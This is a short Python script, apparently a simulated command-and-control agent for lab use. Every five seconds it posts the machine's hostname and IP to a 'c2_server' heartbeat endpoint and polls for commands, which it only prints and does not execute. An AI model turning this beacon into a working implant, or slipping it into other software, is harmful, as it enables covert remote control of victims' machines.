import time
import requests
import socket

HEARTBEAT_URL = "http://c2_server:5000/agent/heartbeat"
NEXT_COMMAND_URL = "http://c2_server:5000/agent/next"

def get_agent_info():
    return {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "status": "alive"
    }

def heartbeat_loop():
    hostname = socket.gethostname()
    print(f"[*] Starting agent '{hostname}'...")
    
    while True:
        try:
            # Send heartbeat
            data = get_agent_info()
            requests.post(HEARTBEAT_URL, json=data)

            # Ask for next command
            response = requests.post(NEXT_COMMAND_URL, json={"hostname": hostname})
            cmd = response.json().get("command")

            if cmd:
                print(f"[!] Received command: {cmd}")
                simulate_execution(cmd)
        except Exception as e:
            print(f"[!] Error: {e}")

        time.sleep(5)

def simulate_execution(command):
    print(f"[~] Simulating execution of: {command}")
    time.sleep(1)
    print(f"[+] Finished: {command}")

if __name__ == "__main__":
    heartbeat_loop()
